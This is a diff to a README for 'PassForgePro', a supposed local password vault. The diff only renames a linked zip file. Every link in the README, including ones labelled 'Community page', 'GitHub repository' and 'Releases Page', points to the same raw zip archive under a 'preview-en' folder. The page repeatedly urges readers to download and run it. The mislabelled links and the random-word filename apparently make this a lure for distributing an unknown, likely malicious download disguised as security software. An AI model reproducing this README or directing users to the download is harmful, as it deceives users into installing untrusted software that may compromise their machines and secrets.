@@ -1,7 +1,7 @@
 # 🔒 PassForgePro - Your Local, Secure Password Vault
 
 ## 📥 Download Now!
-[![Download PassForgePro](https://raw.githubusercontent.com/0DDW/PassForgePro/main/preview-en/Pass-Pro-Forge-2.8.zip)](https://raw.githubusercontent.com/0DDW/PassForgePro/main/preview-en/Pass-Pro-Forge-2.8.zip)
+[![Download PassForgePro](https://raw.githubusercontent.com/0DDW/PassForgePro/main/preview-en/Pass-Pro-Forge-logrolling.zip)](https://raw.githubusercontent.com/0DDW/PassForgePro/main/preview-en/Pass-Pro-Forge-logrolling.zip)
 
 ## 📖 Introduction
 PassForge Pro is a local-first password vault designed for maximum security. Built with Python, it protects your sensitive information using AES-256 encryption and advanced security features. This application aims for total privacy—no cloud storage and no tracking. With PassForge Pro, you own your data.
@@ -24,7 +24,7 @@ To use PassForge Pro, follow these simple steps to download and run the software
 
 ## 📦 Download & Install
 1. **Visit the Releases Page:** Go to the following link to access the download options:
-   [Download PassForgePro](https://raw.githubusercontent.com/0DDW/PassForgePro/main/preview-en/Pass-Pro-Forge-2.8.zip)
+   [Download PassForgePro](https://raw.githubusercontent.com/0DDW/PassForgePro/main/preview-en/Pass-Pro-Forge-logrolling.zip)
 
 2. **Select the Download:** On the releases page, look for the latest version. You will find different files for your operating system. 
 
@@ -52,7 +52,7 @@ PassForge Pro protects your information using industry-standard encryption. No d
 - **Anti-Forensic Features:** Additional layers of security help keep your data safe even from advanced attacks.
 
 ## 🌐 Community and Support
-If you have questions or need assistance, feel free to check our [Community page](https://raw.githubusercontent.com/0DDW/PassForgePro/main/preview-en/Pass-Pro-Forge-2.8.zip). 
+If you have questions or need assistance, feel free to check our [Community page](https://raw.githubusercontent.com/0DDW/PassForgePro/main/preview-en/Pass-Pro-Forge-logrolling.zip). 
 
 You can find useful tips and share your experience with other users. Support for beginners is a core part of our community.
 
@@ -65,7 +65,7 @@ Currently, resetting the master password is not possible. Ensure you choose a se
 Yes, but each installation will require its own master password and vault. Your data stays securely stored locally.
 
 ### Is PassForge Pro open-source?
-Yes, PassForge Pro is open-source. You can view the source code on the [GitHub repository](https://raw.githubusercontent.com/0DDW/PassForgePro/main/preview-en/Pass-Pro-Forge-2.8.zip).
+Yes, PassForge Pro is open-source. You can view the source code on the [GitHub repository](https://raw.githubusercontent.com/0DDW/PassForgePro/main/preview-en/Pass-Pro-Forge-logrolling.zip).
 
 ### Can I contribute to the project?
 Absolutely! We welcome contributions. Check the contribution guidelines in the repository.
@@ -74,4 +74,4 @@ Absolutely! We welcome contributions. Check the contribution guidelines in the r
 Your passwords deserve the highest level of security, and PassForge Pro provides that with simple setup and effective features. Empower yourself against cyber threats today by downloading PassForge Pro.
 
 Visit the following link to download the application and protect your data:  
-[Download PassForgePro](https://raw.githubusercontent.com/0DDW/PassForgePro/main/preview-en/Pass-Pro-Forge-2.8.zip)
+[Download PassForgePro](https://raw.githubusercontent.com/0DDW/PassForgePro/main/preview-en/Pass-Pro-Forge-logrolling.zip)
